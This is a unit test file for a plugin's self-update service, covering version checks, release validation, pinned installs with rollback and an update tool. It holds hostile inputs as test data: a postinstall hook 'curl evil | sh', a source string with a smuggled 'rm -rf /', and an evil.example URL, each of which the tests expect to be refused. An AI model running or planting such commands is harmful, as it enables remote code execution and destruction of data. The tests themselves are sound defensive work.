/**
 * Unit tests for the online-update path: version handling, release-metadata
 * validation, install eligibility, the replacement flow with recovery, and the
 * `codex_tools_update` tool surface. None of these touch the network or a real
 * profile.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { compareVersions, isStableVersion, parseVersion, versionFromTag } from "../lib/version.mjs";
import {
  BUNDLE_NAME,
  INSTALL_SPEC,
  RELEASE_API,
  UpdateService,
  boundedJson,
  observedSource,
  readStableRelease,
  supportedSource,
} from "../lib/update-service.mjs";
import { createUpdateTool } from "../lib/update-tool.mjs";
import { defineTool } from "../lib/define-tool.mjs";

/** A JSON response with the headers the reader inspects. */
function jsonResponse(value, { status = 200, headers = {}, url = RELEASE_API, redirected = false } = {}) {
  const body = new TextEncoder().encode(JSON.stringify(value));
  return {
    status,
    ok: status >= 200 && status < 300,
    url,
    redirected,
    headers: { get: (name) => headers[name.toLowerCase()] ?? null },
    body: {
      getReader() {
        let done = false;
        return {
          async read() {
            if (done) return { done: true, value: undefined };
            done = true;
            return { done: false, value: body };
          },
          async cancel() {},
          releaseLock() {},
        };
      },
    },
  };
}

/** A valid `releases/latest` payload for one version. */
function releasePayload(version, overrides = {}) {
  const tag = `v${version}`;
  return {
    draft: false,
    prerelease: false,
    tag_name: tag,
    html_url: `https://github.com/Syngnat/dsh-codex-tools/releases/tag/${tag}`,
    ...overrides,
  };
}

/** A bundle row as `pluginManager.listBundles()` reports it. */
function bundleRow(overrides = {}) {
  return {
    name: BUNDLE_NAME,
    version: "1.0.0",
    source: `github:Syngnat/dsh-codex-tools#${"a".repeat(40)}`,
    installed: true,
    enabled: true,
    availability: "profile",
    removable: true,
    ...overrides,
  };
}

/** A manager stub that records calls and serves a scripted bundle row. */
function managerStub({ rows = [bundleRow()], receipts = {} } = {}) {
  const calls = [];
  const state = { rows: [...rows] };
  const receipt = (name) => receipts[name] ?? { application: "applied", bundle: BUNDLE_NAME, version: "1.0.1" };
  return {
    calls,
    state,
    async listBundles() {
      return state.rows;
    },
    async removeBundle(name) {
      calls.push(["removeBundle", name]);
      state.rows = [];
      return receipt("removeBundle");
    },
    async installBundle(spec, options) {
      calls.push(["installBundle", spec, options]);
      // The version follows the pinned commit, exactly as a real install does.
      const commit = /#([a-f0-9]{40})$/u.exec(spec)?.[1];
      const version = commit === "b".repeat(40) ? "1.0.1" : "1.0.0";
      state.rows = [bundleRow({ version, source: spec, enabled: options?.enabled ?? false })];
      return { ...receipt("installBundle"), version };
    },
    async setBundleEnabled(name, enabled) {
      calls.push(["setBundleEnabled", name, enabled]);
      state.rows = state.rows.map((row) => ({ ...row, enabled }));
      return receipt("setBundleEnabled");
    },
  };
}

/**
 * A fetch stub that answers the release endpoint and the tag/manifest lookups.
 *
 * Each version maps to its own commit so that resolving the target and the
 * restore source are distinguishable, exactly as they are against GitHub.
 */
function fetchStub({ release = releasePayload("1.0.1"), manifestFor = () => ({ name: BUNDLE_NAME, dsh: { bundle: { patch: "./cordis.patch.yml" } } }) } = {}) {
  const seen = [];
  const commitFor = (version) => (version === "1.0.1" ? "b".repeat(40) : "a".repeat(40));
  const versionFor = (commit) => (commit === "b".repeat(40) ? "1.0.1" : "1.0.0");
  const fetcher = async (url) => {
    const target = String(url);
    seen.push(target);
    if (target === RELEASE_API) {
      if (release instanceof Error) throw release;
      return jsonResponse(release, { headers: { "content-type": "application/json" } });
    }
    const tag = /\/git\/ref\/tags\/v(.+)$/u.exec(target);
    if (tag !== null) return jsonResponse({ object: { type: "commit", sha: commitFor(tag[1]) } });
    const raw = /raw\.githubusercontent\.com\/[^/]+\/[^/]+\/([a-f0-9]{40})\/package\.json$/u.exec(target);
    if (raw !== null) {
      const version = versionFor(raw[1]);
      return jsonResponse({ ...manifestFor(version), version });
    }
    throw new Error(`unexpected fetch: ${target}`);
  };
  fetcher.seen = seen;
  return fetcher;
}

// ---------------------------------------------------------------- version

test("version helpers accept only strict stable versions", () => {
  assert.deepEqual(parseVersion("1.2.3"), { major: 1, minor: 2, patch: 3 });
  for (const bad of ["1.2", "1.2.3.4", "v1.2.3", "1.2.3-rc.1", "01.2.3", "^1.2.3", "", null, 42]) {
    assert.equal(parseVersion(bad), null, `${String(bad)} should not parse`);
  }
  assert.equal(compareVersions("1.2.3", "1.10.0"), -1);
  assert.equal(compareVersions("2.0.0", "2.0.0"), 0);
  assert.equal(compareVersions("1.0.1", "1.0.0"), 1);
  assert.equal(compareVersions("x", "1.0.0"), null);
  assert.equal(versionFromTag("v2.0.0"), "2.0.0");
  assert.equal(versionFromTag("2.0.0"), "2.0.0");
  assert.equal(versionFromTag("v2.0"), null);
  assert.equal(isStableVersion("1.0.0"), true);
});

// ------------------------------------------------------- release metadata

test("readStableRelease accepts a well-formed stable release", () => {
  assert.deepEqual(readStableRelease(releasePayload("1.2.3")), {
    latestVersion: "1.2.3",
    releaseUrl: "https://github.com/Syngnat/dsh-codex-tools/releases/tag/v1.2.3",
  });
});

test("readStableRelease refuses drafts, prereleases and foreign URLs", () => {
  const cases = [
    releasePayload("1.0.0", { draft: true }),
    releasePayload("1.0.0", { prerelease: true }),
    releasePayload("1.0.0", { tag_name: "v1.0.0-rc.1" }),
    releasePayload("1.0.0", { html_url: "https://evil.example/releases/tag/v1.0.0" }),
    releasePayload("1.0.0", { html_url: "https://github.com/Other/repo/releases/tag/v1.0.0" }),
    releasePayload("1.0.0", { html_url: "https://github.com/Syngnat/dsh-codex-tools/releases/tag/v9.9.9" }),
    releasePayload("1.0.0", { html_url: "http://github.com/Syngnat/dsh-codex-tools/releases/tag/v1.0.0" }),
    null,
    [],
  ];
  for (const value of cases) {
    assert.throws(() => readStableRelease(value), /invalid-response/, JSON.stringify(value));
  }
});

test("boundedJson refuses an oversized body", async () => {
  const big = { pad: "x".repeat(300_000) };
  await assert.rejects(() => boundedJson(jsonResponse(big), new AbortController().signal), /invalid-response/);
});

test("boundedJson refuses a declared oversized content-length", async () => {
  const response = jsonResponse({}, { headers: { "content-length": "999999999" } });
  await assert.rejects(() => boundedJson(response, new AbortController().signal), /invalid-response/);
});

// ----------------------------------------------------------- source policy

test("supportedSource accepts only this repository", () => {
  const version = "1.0.0";
  for (const good of [
    "github:Syngnat/dsh-codex-tools",
    "github:Syngnat/dsh-codex-tools#v1.0.0",
    `github:Syngnat/dsh-codex-tools#${"a".repeat(40)}`,
    "https://github.com/Syngnat/dsh-codex-tools",
    "git+https://github.com/Syngnat/dsh-codex-tools.git",
  ]) {
    assert.equal(supportedSource(good, version), true, good);
  }
  for (const bad of [
    "link:/Users/someone/checkout",
    "github:SomeoneElse/dsh-codex-tools",
    "github:Syngnat/dsh-codex-tools#v9.9.9",
    "github:Syngnat/dsh-codex-tools#main",
    "github:Syngnat/dsh-codex-tools#v1.0.0#extra",
    "",
    null,
    "github:Syngnat/dsh-codex-tools\nrm -rf /",
  ]) {
    assert.equal(supportedSource(bad, version), false, String(bad));
  }
});

test("observedSource keeps a bounded, control-character-free copy", () => {
  assert.equal(observedSource("github:Syngnat/dsh-codex-tools"), "github:Syngnat/dsh-codex-tools");
  assert.equal(observedSource("bad\u0000source"), null);
  assert.equal(observedSource("x".repeat(201)), null);
  assert.equal(observedSource(undefined), null);
});

// ------------------------------------------------------------ check flow

test("check reports an available update and never installs", async () => {
  const fetcher = fetchStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager: managerStub(), fetch: fetcher });
  const status = await service.check();
  assert.equal(status.status, "update-available");
  assert.equal(status.latestVersion, "1.0.1");
  assert.equal(status.currentVersion, "1.0.0");
  assert.equal(status.error, null);
  assert.deepEqual(fetcher.seen, [RELEASE_API]);
});

test("check reports current and ahead", async () => {
  const same = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: fetchStub({ release: releasePayload("1.0.0") }),
  });
  assert.equal((await same.check()).status, "current");

  const ahead = new UpdateService({
    currentVersion: "2.0.0",
    manager: managerStub(),
    fetch: fetchStub({ release: releasePayload("1.0.0") }),
  });
  assert.equal((await ahead.check()).status, "ahead");
});

test("check maps transport failures to safe codes", async () => {
  const rateLimited = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: async () => jsonResponse({}, { status: 403 }),
  });
  assert.equal((await rateLimited.check()).error, "rate-limited");

  const notFound = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: async () => jsonResponse({}, { status: 404 }),
  });
  assert.equal((await notFound.check()).error, "not-found");

  const broken = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: async () => {
      throw new Error("offline");
    },
  });
  assert.equal((await broken.check()).error, "network");
});

test("check is coalesced and cooled down", async () => {
  let calls = 0;
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    cooldownMs: 60_000,
    fetch: async () => {
      calls += 1;
      return jsonResponse(releasePayload("1.0.1"), { headers: { "content-type": "application/json" } });
    },
  });
  await Promise.all([service.check(), service.check()]);
  await service.check();
  assert.equal(calls, 1);
});

// ------------------------------------------------------------ eligibility

test("eligibility names the reason an install is refused", async () => {
  const cases = [
    [{ installed: false }, "not-installed"],
    [{ availability: "catalog" }, "unsupported-installation"],
    [{ readOnlyReason: "management-required" }, "unsupported-installation"],
    [{ error: { code: "boom" } }, "installation-error"],
    [{ version: "1.0" }, "unsupported-version"],
    [{ version: "1.0.1" }, "restart-required"],
    [{ source: "link:/tmp/checkout" }, "unsupported-source"],
    [{ enabled: false }, "disabled"],
  ];
  for (const [patch, reason] of cases) {
    const service = new UpdateService({ currentVersion: "1.0.0", manager: managerStub({ rows: [bundleRow(patch)] }) });
    const result = await service.eligibility();
    assert.equal(result.reason, reason, JSON.stringify(patch));
  }
  const ok = new UpdateService({ currentVersion: "1.0.0", manager: managerStub() });
  assert.equal((await ok.eligibility()).reason, null);
});

test("a newer copy on disk is reported as installed, not as an update to install", async () => {
  const service = new UpdateService({
    currentVersion: "2.0.13",
    manager: managerStub({ rows: [bundleRow({ version: "2.0.14" })] }),
  });
  const status = await service.statusWithEligibility();
  assert.equal(status.reason, "restart-required");
  assert.equal(status.available, false);
  assert.equal(status.installedVersion, "2.0.14");
  assert.equal(status.currentVersion, "2.0.13");
});

test("eligibility reports a missing manager", async () => {
  const service = new UpdateService({ currentVersion: "1.0.0", manager: undefined });
  assert.equal((await service.eligibility()).reason, "manager-unavailable");
});

// ---------------------------------------------------------------- install

test("install refuses without explicit confirmation", async () => {
  const manager = managerStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await assert.rejects(() => service.install({}), /confirmation-required/);
  await assert.rejects(() => service.install({ confirm: "yes" }), /confirmation-required/);
  assert.deepEqual(manager.calls, []);
});

test("install pins the target to a verified commit and replaces the bundle", async () => {
  const manager = managerStub();
  const fetcher = fetchStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetcher });
  await service.check();
  const result = await service.install({ confirm: true });
  assert.equal(result.outcome, "updated");
  assert.equal(result.installedVersion, "1.0.1");
  assert.equal(result.previousVersion, "1.0.0");
  assert.equal(result.spec, `${INSTALL_SPEC}#${"b".repeat(40)}`);
  assert.deepEqual(
    manager.calls.map((call) => call[0]),
    ["removeBundle", "installBundle", "setBundleEnabled"],
  );
  // The install is pinned, and never enabled before it is verified.
  assert.equal(manager.calls[1][1], `${INSTALL_SPEC}#${"b".repeat(40)}`);
  assert.equal(manager.calls[1][2].enabled, false);
});

test("install refuses a manifest that does not match the package", async () => {
  const manager = managerStub();
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager,
    fetch: fetchStub({ manifestFor: () => ({ name: "someone-else", dsh: { bundle: {} } }) }),
  });
  await service.check();
  await assert.rejects(() => service.install({ confirm: true }), /package-mismatch/);
  assert.deepEqual(manager.calls, []);
});

test("install refuses a package that declares an install hook", async () => {
  const manager = managerStub();
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager,
    fetch: fetchStub({
      manifestFor: () => ({ name: BUNDLE_NAME, dsh: { bundle: {} }, scripts: { postinstall: "curl evil | sh" } }),
    }),
  });
  await service.check();
  await assert.rejects(() => service.install({ confirm: true }), /script-review-required/);
  assert.deepEqual(manager.calls, []);
});

test("install refuses a target that is not newer", async () => {
  const manager = managerStub();
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager,
    fetch: fetchStub({ release: releasePayload("1.0.0") }),
  });
  await service.check();
  await assert.rejects(() => service.install({ confirm: true }), /not-newer/);
  assert.deepEqual(manager.calls, []);
});

test("install restores the previous version when the replacement fails", async () => {
  const manager = managerStub();
  // The first install fails; the restore install succeeds.
  let installs = 0;
  const original = manager.installBundle.bind(manager);
  manager.installBundle = async (spec, options) => {
    installs += 1;
    if (installs === 1) {
      manager.calls.push(["installBundle", spec, options]);
      return { application: "failed", error: { code: "install-failed" } };
    }
    return original(spec, options);
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  const result = await service.install({ confirm: true });
  assert.equal(result.outcome, "restored");
  assert.equal(result.restoredVersion, "1.0.0");
  assert.equal(result.error, "install-failed");
  const rows = await manager.listBundles();
  assert.equal(rows[0].version, "1.0.0");
  assert.equal(rows[0].enabled, true);
});

test("install reports repair-required when the restore also fails", async () => {
  const manager = managerStub();
  manager.installBundle = async (spec, options) => {
    manager.calls.push(["installBundle", spec, options]);
    return { application: "failed", error: { code: "install-failed" } };
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  await assert.rejects(
    () => service.install({ confirm: true }),
    (error) => error.outcome === "repair-required" && error.code === "install-failed",
  );
});

test("install does not overwrite an installation another caller made", async () => {
  const manager = managerStub();
  manager.removeBundle = async (name) => {
    manager.calls.push(["removeBundle", name]);
    manager.state.rows = [bundleRow({ version: "9.9.9", source: "github:SomeoneElse/fork" })];
    return { application: "applied" };
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  await assert.rejects(
    () => service.install({ confirm: true }),
    (error) => error.outcome === "repair-required" && error.detailCode === "foreign-installation",
  );
  assert.equal((await manager.listBundles())[0].version, "9.9.9");
});

// ------------------------------------------------------------------- tool

/** A tool wired to a stub service. */
function updateToolFor(service) {
  return createUpdateTool({
    defineTool,
    getService: () => undefined,
    createService: () => service,
  });
}

test("codex_tools_update exposes status, check and install", () => {
  const tool = updateToolFor(new UpdateService({ currentVersion: "1.0.0", manager: managerStub() }));
  assert.deepEqual(tool.parameters.properties.action.enum, ["status", "check", "install"]);
  assert.deepEqual(tool.parameters.required, ["action"]);
});

test("codex_tools_update status explains the running version and eligibility", async () => {
  const service = new UpdateService({ currentVersion: "1.0.0", manager: managerStub() });
  const text = await updateToolFor(service).execute({ action: "status" }, {});
  assert.match(text, /running version: 1\.0\.0/);
  assert.match(text, /online update available: yes/);
  assert.match(text, /github\.com\/Syngnat\/dsh-codex-tools/);
});

test("codex_tools_update status names why an update is refused", async () => {
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub({ rows: [bundleRow({ source: "link:/tmp/checkout" })] }),
  });
  const text = await updateToolFor(service).execute({ action: "status" }, {});
  assert.match(text, /online update available: no \(unsupported-source\)/);
});

test("codex_tools_update check reports the release and the next step", async () => {
  const service = new UpdateService({ currentVersion: "1.0.0", manager: managerStub(), fetch: fetchStub() });
  const text = await updateToolFor(service).execute({ action: "check" }, {});
  assert.match(text, /latest release: 1\.0\.1/);
  assert.match(text, /confirm: true/);
});

test("codex_tools_update install refuses without confirm and says so", async () => {
  const manager = managerStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  const text = await updateToolFor(service).execute({ action: "install" }, {});
  assert.match(text, /Refusing to install without explicit confirmation/);
  assert.deepEqual(manager.calls, []);
});

test("codex_tools_update install reports a successful update", async () => {
  const manager = managerStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  const text = await updateToolFor(service).execute({ action: "install", confirm: true }, {});
  assert.match(text, /Updated @local\/dsh-codex-tools from 1\.0\.0 to 1\.0\.1/);
  assert.match(text, /no restart was required/);
});

test("codex_tools_update install reports a restore as a non-fatal outcome", async () => {
  const manager = managerStub();
  let installs = 0;
  const original = manager.installBundle.bind(manager);
  manager.installBundle = async (spec, options) => {
    installs += 1;
    if (installs === 1) {
      manager.calls.push(["installBundle", spec, options]);
      return { application: "failed", error: { code: "install-failed" } };
    }
    return original(spec, options);
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  const text = await updateToolFor(service).execute({ action: "install", confirm: true }, {});
  assert.match(text, /previous version 1\.0\.0 was restored/);
});

test("codex_tools_update install reports repair-required with a manual command", async () => {
  const manager = managerStub();
  manager.installBundle = async (spec, options) => {
    manager.calls.push(["installBundle", spec, options]);
    return { application: "failed", error: { code: "install-failed" } };
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  const text = await updateToolFor(service).execute({ action: "install", confirm: true }, {});
  assert.match(text, /automatic restore also failed/);
  assert.match(text, /dsh plugin install github:Syngnat\/dsh-codex-tools/);
});

test("codex_tools_update surfaces a refusal as text rather than throwing", async () => {
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub({ rows: [bundleRow({ source: "link:/tmp/checkout" })] }),
    fetch: fetchStub(),
  });
  const text = await updateToolFor(service).execute({ action: "install", confirm: true }, {});
  assert.match(text, /Cannot complete "install": unsupported-source/);
  assert.match(text, /not installed from this repository/);
});
